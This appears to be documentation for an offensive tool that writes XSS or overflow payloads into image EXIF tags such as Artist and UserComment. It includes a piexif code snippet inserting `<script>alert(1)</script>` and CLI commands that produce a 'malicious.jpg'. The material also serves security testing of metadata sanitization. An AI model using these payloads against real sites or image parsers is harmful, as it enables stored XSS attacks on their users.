# Image EXIF Injection

## 1. Concept: What is it?
Images (JPEG, TIFF, WebP) contain metadata formatted under the Exchangeable Image File (EXIF) standard. This standard includes tags for camera model, GPS coordinates, and strings like `Artist` or `UserComment`. 

Because these are often rendered directly in browsers or desktop web apps without sanitization, injecting HTML or JavaScript payloads into these fields can lead to Stored Cross-Site Scripting (XSS) or trigger buffer overflows in vulnerable native image parsers.

## 2. Implementation: How does it work?
In `metadata_engine.py`, the `MetadataEngine` uses the `piexif` library to read, modify, and rewrite the EXIF dictionary.

The `inject_payload` function targets specific String-based EXIF tags (like the `0th` IFD `Artist` tag or the `Exif` IFD `UserComment` tag).
1. It loads the image via `Pillow`.
2. It parses existing EXIF data map.
3. It overwrites a defined field with raw payload bytes (e.g., `<script>alert(1)</script>`).
4. It saves the image, re-embedding the modified EXIF dictionary.

```python
# Pseudo-code implementation
exif_dict = piexif.load(image.info["exif"])
exif_dict["0th"][piexif.ImageIFD.Artist] = b"<script>alert(1)</script>"
exif_bytes = piexif.dump(exif_dict)
image.save(output_path, exif=exif_bytes)
```

## 3. Usage
**CLI Command:**
```bash
# View existing EXIF tags
python3 hider.py view image.jpg

# Edit a specific tag natively
python3 hider.py edit image.jpg --key Artist --value "Attacker"

# Auto-inject a pre-made XSS or Overflow payload into EXIF
python3 hider.py inject image.jpg --type xss --out malicious.jpg
```
